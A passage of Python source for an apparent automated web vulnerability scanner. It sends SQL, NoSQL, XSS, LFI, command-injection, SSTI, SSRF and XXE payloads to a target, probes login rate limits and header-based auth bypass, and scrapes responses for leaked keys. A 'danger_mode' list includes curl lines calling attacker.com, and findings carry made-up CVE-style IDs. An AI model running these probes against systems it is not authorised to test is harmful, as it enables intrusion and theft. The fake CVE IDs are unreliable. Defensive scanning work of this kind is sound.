                            proof_response=resp.text[:300]))
                        found_params.add(key)
                        break
                    # Time-based blind detection
                    if 'SLEEP' in p.upper() or 'WAITFOR' in p.upper():
                        start = time.time()
                        r2 = self._get(url, timeout=10)
                        elapsed = time.time() - start
                        if elapsed >= 4.0:
                            vulns.append(self._vuln(
                                'CVE-2024-SQLI-002', 'Blind SQL Injection (Time-Based)', 'Critical', 0.98,
                                f"Time-based blind SQL injection confirmed in parameter '{key}' — "
                                f"response delayed {elapsed:.1f}s with payload `{p}`. "
                                "Full database extraction possible via boolean/time queries.",
                                url, proof_request=f"GET {url}",
                                proof_response=f"Response time: {elapsed:.2f}s"))
                            found_params.add(key)
                            break
                except Exception:
                    pass
        return vulns

    # ─── NoSQL INJECTION ──────────────────────────────────────────────────────
    def detect_nosqli(self, target_url: str) -> List[Dict]:
        vulns = []
        points = self._get_injection_points(target_url)
        nosql_payloads = [
            "' || 1==1//", '{"$gt": ""}', '{"$ne": null}', '[$ne]=1',
            '{"$gt": -1}', '{"$regex": ".*"}', '{"$where": "1==1"}',
            "' || 'a'=='a", '{"$nin": ["false"]}',
        ]
        baseline_resp = self._get(target_url, timeout=5)
        baseline_len = len(baseline_resp.text) if baseline_resp else 0

        for base, key, val in points[:5]:
            for p in nosql_payloads:
                try:
                    url = self._build_url(base, key, p)
                    resp = self._get(url, timeout=5)
                    if resp and resp.status_code == 200 and abs(len(resp.text) - baseline_len) > 300:
                        vulns.append(self._vuln(
                            'CVE-2024-NOSQL-001', 'NoSQL Injection', 'Critical', 0.96,
                            f"Potential NoSQL injection in parameter '{key}'. "
                            "Response size changed significantly with operator payload — authentication bypass possible.",
                            url, proof_request=f"GET {url}",
                            proof_response=resp.text[:300]))
                        break
                    # JSON body injection
                    resp2 = self._post(base, json={key: {"$ne": None}}, timeout=5)
                    if resp2 and resp2.status_code == 200 and abs(len(resp2.text) - baseline_len) > 200:
                        vulns.append(self._vuln(
                            'CVE-2024-NOSQL-002', 'NoSQL Injection (JSON Body)', 'Critical', 0.95,
                            f"NoSQL operator injection in POST JSON body parameter '{key}'.",
                            base, proof_request=f'POST {base} body={{"{ key}": {{"$ne": null}}}}',
                            proof_response=resp2.text[:300]))
                        break
                except Exception:
                    pass
        return vulns

    # ─── XSS ──────────────────────────────────────────────────────────────────
    def detect_xss_advanced(self, target_url: str, danger_mode: bool = False) -> List[Dict]:
        vulns = []
        points = self._get_injection_points(target_url)
        payloads = PAYLOADS['xss_basic'][:]
        if danger_mode:
            payloads += PAYLOADS['xss_waf_bypass']

        REFLECTION_MARKERS = ['<script>', 'alert(', 'onerror=', 'onload=', '<svg',
                              'onfocus=', 'javascript:', 'eval(', 'setTimeout(']

        found_params = set()
        for base, key, val in points:
            if key in found_params:
                continue
            for p in payloads[:15 if danger_mode else 6]:
                try:
                    url = self._build_url(base, key, p)
                    resp = self._get(url, timeout=6)
                    if resp:
                        reflected_payload = quote(p, safe='<>="\'')
                        body_lower = resp.text
                        # Check raw reflection
                        if p in body_lower or any(m in body_lower.lower() for m in REFLECTION_MARKERS):
                            # Verify it's not in a comment or encoded
                            if p in body_lower:
                                vulns.append(self._vuln(
                                    'CVE-2024-XSS-001', 'Reflected Cross-Site Scripting (XSS)', 'High', 0.92,
                                    f"XSS payload '{p[:60]}' was reflected unsanitized in parameter '{key}'. "
                                    "Attackers can steal cookies, hijack sessions, or perform phishing attacks.",
                                    url, proof_request=f"GET {url}",
                                    proof_response=f"Reflected: {p[:80]}"))
                                found_params.add(key)
                                break

                    # Also POST to forms
                    resp2 = self._post(base, data={key: p}, timeout=6)
                    if resp2 and p in resp2.text:
                        vulns.append(self._vuln(
                            'CVE-2024-XSS-002', 'Reflected XSS (POST Form)', 'High', 0.90,
                            f"XSS payload reflected through POST parameter '{key}'. "
                            "Can be used in CSRF+XSS attack chains.",
                            base, proof_request=f"POST {base} {key}={p}",
                            proof_response=resp2.text[:300]))
                        found_params.add(key)
                        break
                except Exception:
                    pass

        # Stored XSS — check if payloads appear on the page after submit
        # (basic heuristic: if baseline doesn't contain it but after POST it does)

        # DOM-based XSS — check JS for dangerous sinks
        try:
            resp = self._get(target_url, timeout=6)
            if resp:
                js_sinks = ['document.write(', 'innerHTML', 'eval(', 'setTimeout(',
                            'document.location', 'window.location', '.href =', 'outerHTML']
                js_sources = ['location.hash', 'location.search', 'location.href',
                              'document.URL', 'document.referrer', 'window.name']
                for sink in js_sinks:
                    for source in js_sources:
                        if sink in resp.text and source in resp.text:
                            vulns.append(self._vuln(
                                'CVE-2024-XSS-003', 'DOM-Based XSS Risk', 'High', 0.88,
                                f"Potential DOM XSS: unsafe sink `{sink}` and user-controlled source `{source}` "
                                "both found in page JavaScript. Manual verification recommended.",
                                target_url, proof_response=f"sink={sink}, source={source}"))
                            break
        except Exception:
            pass

        return vulns

    # ─── LFI / PATH TRAVERSAL ─────────────────────────────────────────────────
    def detect_lfi_advanced(self, target_url: str) -> List[Dict]:
        vulns = []
        points = self._get_injection_points(target_url)
        payloads = PAYLOADS['lfi']

        LFI_MARKERS = [
            'root:x:0:', 'daemon:', 'bin/bash', 'bin/sh',
            '[extensions]', 'for 16-bit app support',
            'uid=', 'www-data', 'Linux version',
            'PD9waH', # base64 of "<?ph"
        ]

        found_params = set()
        for base, key, val in points:
            if key in found_params:
                continue
            for p in payloads:
                try:
                    url = self._build_url(base, key, p)
                    resp = self._get(url, timeout=6)
                    if resp and any(m in resp.text for m in LFI_MARKERS):
                        vulns.append(self._vuln(
                            'CVE-2024-LFI-001', 'Local File Inclusion (LFI)', 'Critical', 0.97,
                            f"LFI confirmed in parameter '{key}' — system file contents returned. "
                            f"Payload: `{p}`. An attacker can read /etc/passwd, config files, and potentially achieve RCE via log poisoning.",
                            url, proof_request=f"GET {url}",
                            proof_response=resp.text[:400]))
                        found_params.add(key)
                        break

                    # PHP wrapper
                    if 'php://filter' in p and resp and len(resp.text) > 200:
                        try:
                            import base64
                            dectext = base64.b64decode(resp.text.strip()).decode('utf-8', errors='ignore')
                            if '<?php' in dectext or '<?=' in dectext:
                                vulns.append(self._vuln(
                                    'CVE-2024-LFI-002', 'PHP Source Code Disclosure via LFI', 'Critical', 0.97,
                                    f"PHP source code extracted via php://filter wrapper in parameter '{key}'. "
                                    "Complete application source code and secrets exposed.",
                                    url, proof_request=f"GET {url}",
                                    proof_response=dectext[:300]))
                                found_params.add(key)
                                break
                        except Exception:
                            pass
                except Exception:
                    pass
        return vulns

    # ─── COMMAND INJECTION ────────────────────────────────────────────────────
    def detect_cmdi_advanced(self, target_url: str, danger_mode: bool = False) -> List[Dict]:
        vulns = []
        points = self._get_injection_points(target_url)
        payloads = PAYLOADS['cmdi'][:]
        if danger_mode:
            payloads += ["& powershell.exe whoami", "; /usr/bin/id", "| ping -c 1 127.0.0.1",
                         "; curl http://$(hostname).attacker.com", "$(curl http://attacker.com)"]

        CMD_MARKERS = ['uid=', 'Volume Serial', 'Windows IP Configuration', 'root:x:',
                       'www-data', 'daemon', 'bin/bash', 'PING 127.0.0.1', 'bytes from 127']

        found_params = set()
        for base, key, val in points:
            if key in found_params:
                continue
            for p in payloads[:15 if danger_mode else 8]:
                try:
                    url = self._build_url(base, key, p)
                    resp = self._get(url, timeout=8)
                    if resp and any(m in resp.text for m in CMD_MARKERS):
                        vulns.append(self._vuln(
                            'CVE-2024-CMDI-001', 'Remote Code Execution (Command Injection)', 'Critical', 0.99,
                            f"Command injection CONFIRMED in parameter '{key}' with payload `{p}`. "
                            "Full server compromise is possible — read files, exfiltrate data, spawn reverse shells.",
                            url, proof_request=f"GET {url}",
                            proof_response=resp.text[:400]))
                        found_params.add(key)
                        break

                    # Time-based blind CMDi
                    if 'sleep' in p.lower() or 'ping' in p.lower():
                        start = time.time()
                        self._get(url, timeout=12)
                        elapsed = time.time() - start
                        if elapsed >= 4.0:
                            vulns.append(self._vuln(
                                'CVE-2024-CMDI-002', 'Blind Command Injection (Time-Based)', 'Critical', 0.97,
                                f"Blind command injection (time-based) in '{key}'. Response delayed {elapsed:.1f}s.",
                                url, proof_request=f"GET {url}",
                                proof_response=f"Response time: {elapsed:.2f}s"))
                            found_params.add(key)
                            break
                except Exception:
                    pass
        return vulns

    # ─── SSTI ─────────────────────────────────────────────────────────────────
    def detect_ssti(self, target_url: str) -> List[Dict]:
        vulns = []
        points = self._get_injection_points(target_url)

        SSTI_MATH_TESTS = [
            ("{{7*7}}", "49"),
            ("${7*7}", "49"),
            ("#{7*7}", "49"),
            ("{{7*'7'}}", "7777777"),
            ("<%= 7*7 %>", "49"),
            ("*{7*7}", "49"),
            ("@{7*7}", "49"),
        ]

        found_params = set()
        for base, key, val in points:
            if key in found_params:
                continue
            for payload, expected in SSTI_MATH_TESTS:
                try:
                    url = self._build_url(base, key, payload)
                    resp = self._get(url, timeout=6)
                    if resp and expected in resp.text:
                        vulns.append(self._vuln(
                            'CVE-2024-SSTI-001', 'Server-Side Template Injection (SSTI)', 'Critical', 0.97,
                            f"SSTI confirmed in parameter '{key}' — expression `{payload}` evaluated to `{expected}`. "
                            "Template injection can lead to full RCE via OS command execution through template context.",
                            url, proof_request=f"GET {url}",
                            proof_response=f"Expression '{payload}' → '{expected}' in response"))
                        found_params.add(key)
                        break
                except Exception:
                    pass
        return vulns

    # ─── SSRF ─────────────────────────────────────────────────────────────────
    def detect_ssrf_advanced(self, target_url: str) -> List[Dict]:
        vulns = []
        parsed = urlparse(target_url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # Test URL/redirect params for SSRF
        resp = self._get(target_url, timeout=6)
        if not resp:
            return vulns

        # Find all URL params
        params_to_test = []
        if parsed.query:
            for key, vals in parse_qs(parsed.query).items():
                if any(k in key.lower() for k in ['url', 'uri', 'path', 'src', 'href',
                                                     'link', 'fetch', 'load', 'file', 'endpoint',
                                                     'target', 'dest', 'img', 'image', 'proxy']):
                    params_to_test.append((key, vals[0]))
        else:
            for p in ['url', 'src', 'path', 'link', 'fetch', 'proxy', 'endpoint', 'target']:
                params_to_test.append((p, 'http://example.com'))

        SSRF_MARKERS = [
            'ami-', 'instance-id', 'iam/', 'security-credentials',
            '"computeMetadata"', 'flavor/self', '169.254',
            '"AccessKeyId"', '"SecretAccessKey"',  # AWS
        ]

        for key, default_val in params_to_test:
            for ssrf_payload in PAYLOADS['ssrf'][:8]:
                try:
                    url = self._build_url(f"{parsed.scheme}://{parsed.netloc}{parsed.path}", key, ssrf_payload)
                    resp = self._get(url, timeout=6)
                    if resp and (any(m in resp.text for m in SSRF_MARKERS)
                                 or (resp.status_code == 200 and '169.254' in ssrf_payload
                                     and len(resp.text) > 10)):
                        vulns.append(self._vuln(
                            'CVE-2024-SSRF-001', 'Server-Side Request Forgery (SSRF)', 'Critical', 0.98,
                            f"SSRF confirmed in parameter '{key}' with payload `{ssrf_payload}`. "
                            "Server made a request to internal infrastructure. Cloud metadata, internal services, "
                            "and credentials may be fully accessible to an attacker.",
                            url, proof_request=f"GET {url}",
                            proof_response=resp.text[:400]))
                        break
                    # Blind SSRF heuristic — response code change
                    baseline = self._get(self._build_url(f"{parsed.scheme}://{parsed.netloc}{parsed.path}", key, 'http://www.google.com'), timeout=5)
                    internal = self._get(self._build_url(f"{parsed.scheme}://{parsed.netloc}{parsed.path}", key, 'http://127.0.0.1'), timeout=3)
                    if baseline and internal and baseline.status_code != internal.status_code:
                        vulns.append(self._vuln(
                            'CVE-2024-SSRF-002', 'Blind SSRF (Port Oracle)', 'High', 0.88,
                            f"Blind SSRF detected in parameter '{key}' — different HTTP status codes for "
                            "external vs internal targets indicate the server is making backend requests.",
                            f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{key}=...",
                            proof_response=f"external={baseline.status_code}, internal={internal.status_code}"))
                        break
                except Exception:
                    pass

        return vulns

    # ─── XXE ──────────────────────────────────────────────────────────────────
    def detect_xxe(self, target_url: str) -> List[Dict]:
        vulns = []
        XXE_MARKERS = ['root:x:0:', '[extensions]', 'windows/win.ini',
                       'uid=', 'daemon:', 'ami-']
        headers = {'Content-Type': 'application/xml', 'User-Agent': random.choice(USER_AGENTS)}
        for payload in PAYLOADS['xxe']:
            try:
                resp = self._post(target_url, data=payload, timeout=6,
                                  headers=headers)
                if resp and any(m in resp.text for m in XXE_MARKERS):
                    vulns.append(self._vuln(
                        'CVE-2024-XXE-001', 'XML External Entity Injection (XXE)', 'Critical', 0.97,
                        "XXE injection confirmed — server processed external entity and returned file contents. "
                        "An attacker can read sensitive system files, perform SSRF, and potentially achieve RCE.",
                        target_url, proof_request=f"POST {target_url} (XML payload)",
                        proof_response=resp.text[:400]))
                    break
            except Exception:
                pass
        return vulns

    # ─── OPEN REDIRECT ────────────────────────────────────────────────────────
    def detect_open_redirect(self, target_url: str) -> List[Dict]:
        vulns = []
        parsed = urlparse(target_url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        found = False
        for param in REDIRECT_PARAMS:
            if found:
                break
            for payload in PAYLOADS['open_redirect'][:6]:
                try:
                    url = self._build_url(base, param, payload)
                    resp = self.session.get(url, timeout=5, allow_redirects=False,
                                           headers={'User-Agent': random.choice(USER_AGENTS)})
                    if resp.status_code in (301, 302, 303, 307, 308):
                        location = resp.headers.get('Location', '')
                        if 'evil.com' in location or 'google.com' in location:
                            vulns.append(self._vuln(
                                'CVE-2024-REDIRECT-001', 'Open Redirect Vulnerability', 'Medium', 0.65,
                                f"Open redirect confirmed via parameter '{param}'. "
                                f"Server redirected to '{location}'. "
                                "Attackers can use this for phishing and bypassing SSRF filters.",
                                url, proof_request=f"GET {url}",
                                proof_response=f"Location: {location}"))
                            found = True
                            break
                except Exception:
                    pass
        return vulns

    # ─── IDOR / BOLA ──────────────────────────────────────────────────────────
    def detect_idor(self, target_url: str) -> List[Dict]:
        vulns = []
        parsed = urlparse(target_url)
        params = parse_qs(parsed.query)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        id_params_found = {k: v[0] for k, v in params.items()
                          if any(ip in k.lower() for ip in ID_PARAMS)}
        if not id_params_found:
            for ip in ID_PARAMS[:5]:
                id_params_found[ip] = '1'

        for key, orig_val in id_params_found.items():
            try:
                orig_url = self._build_url(base, key, orig_val)
                resp_orig = self._get(orig_url, timeout=5)
                if not resp_orig or resp_orig.status_code != 200:
                    continue

                for alt_id in ['0', '2', '99', '1000', '-1']:
                    if alt_id == orig_val:
                        continue
                    alt_url = self._build_url(base, key, alt_id)
                    resp_alt = self._get(alt_url, timeout=5)
                    if resp_alt and resp_alt.status_code == 200:
                        # If both 200 and substantially different content returned → IDOR
                        if abs(len(resp_alt.text) - len(resp_orig.text)) > 100:
                            vulns.append(self._vuln(
                                'CVE-2024-IDOR-001', 'Insecure Direct Object Reference (IDOR/BOLA)', 'High', 0.88,
                                f"IDOR/BOLA risk detected in parameter '{key}'. "
                                f"Changing value from '{orig_val}' to '{alt_id}' returned different data (HTTP 200). "
                                "Without authorization checks, attackers can access other users' data.",
                                alt_url, proof_request=f"GET {alt_url}",
                                proof_response=f"Original ({orig_val}): {len(resp_orig.text)}B, Alt ({alt_id}): {len(resp_alt.text)}B"))
                            break
            except Exception:
                pass
        return vulns

    # ─── BROKEN AUTH & RATE LIMITING ──────────────────────────────────────────
    def detect_broken_auth(self, target_url: str) -> List[Dict]:
        vulns = []
        parsed = urlparse(target_url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # Check auth bypass via header manipulation
        bypass_paths = ['/admin', '/admin/config', '/api/v1/users', '/api/admin',
                        '/api/internal', '/internal/users', '/_admin']
        bypass_headers = [
            {'X-Custom-IP-Authorization': '127.0.0.1'},
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Client-IP': '127.0.0.1'},
        ]

        for path in bypass_paths:
            url = base + path
            for headers in bypass_headers:
                try:
                    resp = self.session.get(url, timeout=5,
                                           headers={**headers, 'User-Agent': random.choice(USER_AGENTS)},
                                           allow_redirects=False)
                    if resp.status_code == 200 and 'login' not in resp.text.lower()[:500]:
                        vulns.append(self._vuln(
                            'CVE-2024-AUTH-001', 'Authentication Bypass via Header Injection', 'Critical', 0.97,
                            f"Accessed privileged endpoint `{path}` without auth by injecting `{list(headers.keys())[0]}: 127.0.0.1`. "
                            "Admin functionality accessible to unauthenticated attackers.",
                            url, proof_request=f"GET {url} with {headers}",
                            proof_response=f"HTTP {resp.status_code}: {resp.text[:200]}"))
                        break
                except Exception:
                    pass

        # Check for rate limiting on login
        login_paths = ['/login', '/api/login', '/api/auth/login', '/auth/login', '/signin']
        for path in login_paths:
            url = base + path
            try:
                success_codes = 0
                for _ in range(5):
                    resp = self._post(url, json={'email': 'test@test.com', 'password': 'wrongpass'}, timeout=4)
                    if resp and resp.status_code not in (429, 503):
                        success_codes += 1
                    else:
                        break
                if success_codes >= 5:
                    vulns.append(self._vuln(
                        'CVE-2024-AUTH-002', 'Missing Rate Limiting (Brute-Force Risk)', 'High', 0.85,
                        f"Login endpoint `{path}` has no rate limiting — 5 consecutive failed auth attempts accepted. "
                        "Attackers can conduct unlimited brute-force or credential stuffing attacks.",
                        url, proof_response=f"5 login attempts accepted, no 429 response"))
                    break
            except Exception:
                pass

        return vulns

    # ─── DESERIALIZATION ──────────────────────────────────────────────────────
    def detect_deserialization(self, target_url: str) -> List[Dict]:
        vulns = []
        try:
            resp = self._get(target_url, timeout=5)
            if resp and any(x in resp.text for x in ['O:8:"', 'gASV', 'rO0AB']):
                vulns.append(self._vuln(
                    'CVE-2024-DESER-001', 'Insecure Deserialization', 'Critical', 0.92,
                    "Serialized object markers detected in HTTP response (PHP, Python, or Java). "
                    "If user-controlled data reaches the deserializer, Remote Code Execution is likely.",
                    target_url, proof_response=resp.text[:200]))
            # Check Content-Type based attacks
            for ct in ['application/x-java-serialized-object',
                       'application/x-www-form-urlencoded']:
                try:
                    resp2 = self._post(target_url, data='rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==',
                                       timeout=4, headers={'Content-Type': ct})
                    if resp2 and resp2.status_code not in (400, 415, 405):
                        vulns.append(self._vuln(
                            'CVE-2024-DESER-002', 'Possible Insecure Deserialization Endpoint', 'High', 0.82,
                            f"Server accepts serialized data with Content-Type '{ct}' without rejecting it. "
                            "May indicate a vulnerable deserialization endpoint.",
                            target_url, proof_response=f"HTTP {resp2.status_code}"))
                        break
                except Exception:
                    pass
        except Exception:
            pass
        return vulns

    # ─── JWT WEAKNESS ─────────────────────────────────────────────────────────
    def detect_jwt_weakness(self, target_url: str) -> List[Dict]:
        vulns = []
        try:
            resp = self._get(target_url, timeout=5)
            if not resp:
                return vulns

            all_text = resp.text + str(dict(resp.headers)) + str(dict(self.session.cookies))
            tokens = re.findall(r'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+', all_text)

            for t in set(tokens):
                try:
                    import base64
                    header_b64 = t.split('.')[0]
                    # Pad base64
                    header_b64 += '=' * (4 - len(header_b64) % 4)
                    header = base64.b64decode(header_b64).decode('utf-8', errors='ignore')

                    if '"alg":"none"' in header or '"alg": "none"' in header or 'HS256' not in header:
                        if 'none' in header.lower():
                            vulns.append(self._vuln(
                                'CVE-2024-JWT-001', 'JWT None Algorithm Attack', 'Critical', 0.98,
                                "JWT uses 'none' algorithm — signature verification is disabled. "
                                "Attacker can forge any JWT token and impersonate any user including admins.",
                                target_url, proof_response=f"JWT header: {header}"))
                    if 'HS256' in header:
                        # Check for weak secret
                        vulns.append(self._vuln(
                            'CVE-2024-JWT-002', 'JWT HS256 Weak Secret Risk', 'Medium', 0.65,
                            "JWT uses HS256 symmetric signing algorithm. If the secret is weak or guessable, "
                            "the token can be forged. Consider RS256 asymmetric signing.",
                            target_url, proof_response=f"JWT header: {header}"))
                except Exception:
                    continue
        except Exception:
            pass
        return vulns

    # ─── CLICKJACKING ─────────────────────────────────────────────────────────
    def detect_clickjacking(self, target_url: str) -> List[Dict]:
        vulns = []
        resp = self._get(target_url)
        if not resp:
            return vulns
        h = resp.headers
        xfo = h.get('X-Frame-Options', '')
        csp = h.get('Content-Security-Policy', '')
        if not xfo and 'frame-ancestors' not in csp:
            vulns.append(self._vuln(
                'CVE-2024-CLICK-001', 'Clickjacking Vulnerability', 'Medium', 0.60,
                "Application has no X-Frame-Options or CSP frame-ancestors directive. "
                "Attackers can embed this site in a hidden iframe and trick users into performing sensitive actions.",
                target_url, proof_response=f"X-Frame-Options: {xfo!r}, CSP: {csp[:100]!r}"))
        return vulns

    # ─── DIRECTORY LISTING ────────────────────────────────────────────────────
    def detect_directory_listing(self, target_url: str) -> List[Dict]:
        vulns = []
        parsed = urlparse(target_url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        dirs_to_check = ['/uploads/', '/files/', '/images/', '/static/', '/assets/',
                         '/backup/', '/logs/', '/tmp/', '/temp/', '/data/', '/media/']
        LISTING_MARKERS = ['Index of ', 'Directory listing for', '<title>Index of', 'Parent Directory']
        for d in dirs_to_check:
            try:
                url = base + d
                resp = self._get(url, timeout=4)
                if resp and resp.status_code == 200:
                    if any(m in resp.text for m in LISTING_MARKERS):
                        vulns.append(self._vuln(
                            'CVE-2024-DIRLIST-001', 'Directory Listing Enabled', 'High', 0.80,
                            f"Directory listing is enabled at '{d}'. Attackers can browse and download all files, "
                            "including configuration files, backups, and sensitive data.",
                            url, proof_request=f"GET {url}",
                            proof_response=resp.text[:300]))
            except Exception:
                pass
        return vulns

    # ─── COMBINED DETECTORS ───────────────────────────────────────────────────
    def detect_deep_vulnerabilities(self, target_url: str, danger_mode: bool = False) -> List[Dict]:
        vulns = []
        with ThreadPoolExecutor(max_workers=12) as executor:
            futures = [
                executor.submit(self.detect_sqli_advanced,      target_url, danger_mode),
                executor.submit(self.detect_nosqli,             target_url),
                executor.submit(self.detect_xss_advanced,       target_url, danger_mode),
                executor.submit(self.detect_lfi_advanced,       target_url),
                executor.submit(self.detect_cmdi_advanced,      target_url, danger_mode),
                executor.submit(self.detect_ssti,               target_url),
                executor.submit(self.detect_ssrf_advanced,      target_url),
                executor.submit(self.detect_xxe,                target_url),
                executor.submit(self.detect_open_redirect,      target_url),
                executor.submit(self.detect_idor,               target_url),
                executor.submit(self.detect_deserialization,    target_url),
                executor.submit(self.detect_jwt_weakness,       target_url),
                executor.submit(self.detect_broken_auth,        target_url),
                executor.submit(self.detect_clickjacking,       target_url),
                executor.submit(self.detect_directory_listing,  target_url),
            ]
            for f in as_completed(futures):
                try:
                    vulns.extend(f.result() or [])
                except Exception as e:
                    logger.error(f"Deep scan future error: {e}")
        return vulns

    def detect_owasp_top_10(self, target_url: str) -> List[Dict]:
        vulns = []
        with ThreadPoolExecutor(max_workers=6) as executor:
            futures = [
                executor.submit(self._check_security_headers, target_url),
                executor.submit(self._check_sensitive_paths,  target_url),
                executor.submit(self._check_cookie_security,  target_url),
                executor.submit(self._check_cors,             target_url),
                executor.submit(self.detect_ssl_vulnerabilities, target_url),
                executor.submit(self.detect_directory_listing, target_url),
            ]
            for f in as_completed(futures):
                try:
                    vulns.extend(f.result() or [])
                except Exception as e:
                    logger.error(f"OWASP scan future error: {e}")
        return vulns


# ═══════════════════════════════════════════════════════════════════════════
#  SENSITIVE DATA LEAKAGE DETECTOR
# ═══════════════════════════════════════════════════════════════════════════
class SensitiveDataLeakageDetector:
    _PATTERN_META = {
        'Google API Key':            ('High',     0.92, 'CVE-2024-L-01'),
        'Firebase URL':              ('Medium',   0.60, 'CVE-2024-L-02'),
        'AWS Access Key':            ('Critical', 0.99, 'CVE-2024-L-03'),
        'AWS Secret Key':            ('Critical', 0.99, 'CVE-2024-L-04'),
        'Stripe Secret Key':         ('Critical', 0.99, 'CVE-2024-L-05'),
        'Stripe Publishable Key':    ('Medium',   0.55, 'CVE-2024-L-06'),
        'GitHub Personal Token':     ('High',     0.90, 'CVE-2024-L-07'),
        'GitHub OAuth':              ('High',     0.90, 'CVE-2024-L-08'),
        'Slack Webhook':             ('High',     0.85, 'CVE-2024-L-09'),
        'Slack Token':               ('High',     0.85, 'CVE-2024-L-10'),
        'Private Key (RSA/OpenSSH)': ('Critical', 0.99, 'CVE-2024-L-11'),
        'Database Connection':       ('Critical', 0.99, 'CVE-2024-L-12'),
        'JWT Token':                 ('High',     0.88, 'CVE-2024-L-13'),
        'Email Address':             ('Low',      0.20, 'CVE-2024-L-14'),
        'Internal IPv4':             ('Medium',   0.55, 'CVE-2024-L-15'),
        'Credentials in JS':         ('High',     0.90, 'CVE-2024-L-16'),
        'Credit Card Number':        ('Critical', 0.98, 'CVE-2024-L-17'),
        'Social Security Number':    ('Critical', 0.97, 'CVE-2024-L-18'),
        'PayPal Braintree Token':    ('Critical', 0.98, 'CVE-2024-L-19'),
        'SendGrid Key':              ('High',     0.88, 'CVE-2024-L-20'),
        'Discord Token':             ('Medium',   0.70, 'CVE-2024-L-21'),
        'Twilio SID':                ('Medium',   0.65, 'CVE-2024-L-22'),
    }

    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False

    def detect_all(self, target_url: str) -> List[Dict]:
        vulns = []
        seen = set()
        try:
            resp = self.session.get(target_url, timeout=10,
                                    headers={'User-Agent': random.choice(USER_AGENTS)})
            # Also check common JS/resource files linked from the page
            js_urls = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', resp.text, re.IGNORECASE)
            pages_to_scan = [target_url] + [urljoin(target_url, j) for j in js_urls[:10]]

            for page_url in pages_to_scan:
                try:
                    r = self.session.get(page_url, timeout=8,
                                         headers={'User-Agent': random.choice(USER_AGENTS)})
                    for name, pattern in RE_SENSITIVE_DATA.items():
                        matches = list(re.finditer(pattern, r.text, re.IGNORECASE))
                        for m in matches:
                            key = hashlib.md5(f"{name}{m.group()}".encode()).hexdigest()
                            if key in seen:
                                continue
                            seen.add(key)
                            sev, epss, cve = self._PATTERN_META.get(name, ('Medium', 0.5, 'CVE-2024-L-99'))
                            snippet = r.text[max(0, m.start()-20):m.end()+20].strip()
                            vulns.append({
                                'cve': cve,
                                'type': f'Sensitive Data Leakage: {name}',
                                'severity': sev,
                                'epss_score': epss,
                                'description': (
                                    f"'{name}' detected in HTTP response from {page_url}. "
                                    "This credential or PII should never appear in client-facing responses. "
                                    f"Snippet: {snippet[:200]}"
                                ),
                                'affected_url': page_url,
                                'status': 'Vulnerable',
                                'proof_request': f"GET {page_url}",
                                'proof_response': snippet[:300],
                            })
                except Exception:
                    pass
        except Exception:
            pass
        return vulns
